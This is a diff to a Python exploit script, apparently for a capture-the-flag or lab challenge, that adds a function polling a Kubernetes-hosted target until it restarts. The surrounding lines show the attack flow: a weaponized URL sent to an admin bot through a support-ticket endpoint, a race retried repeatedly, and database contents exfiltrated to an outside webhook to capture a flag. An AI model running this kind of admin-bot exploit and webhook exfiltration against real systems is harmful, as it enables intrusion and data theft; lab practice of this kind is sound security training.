@@ -145,6 +145,22 @@ def trigger_admin_bot():
     print(f"[*] Dispatching Admin Bot to {weaponized_url}")
     session.post(f"{TARGET_URL}/api/v1/support/ticket", json={"url": weaponized_url})
 
+def wait_for_server():
+    """Polls the server until Kubernetes successfully spins up the replacement Pod."""
+    print("[*] Waiting for K8s to bring the replacement Pod online...")
+    for _ in range(30): # Wait up to 60 seconds
+        try:
+            # We use a short timeout so we don't hang on a dead socket
+            requests.get(TARGET_URL, timeout=2)
+            print("[+] Server is back online!")
+            return
+        except requests.exceptions.RequestException:
+            time.sleep(2)
+    
+    print("[-] Server failed to come back online. Check kubectl logs.")
+    exit(1)
+
+
 
 if __name__ == "__main__":
     print("==================================================")
@@ -170,5 +186,6 @@ if __name__ == "__main__":
         print(f"[+] Waiting for possible DB exfiltration at {WEBHOOK_URL} ...")
         print("[*] Check the webhook now. If nothing arrived, the race will retry automatically.")
         time.sleep(5)
+        wait_for_server()
 
     print("\n[+] Exhausted attempts. If the flag never arrived, re-run -- race outcomes are probabilistic.")
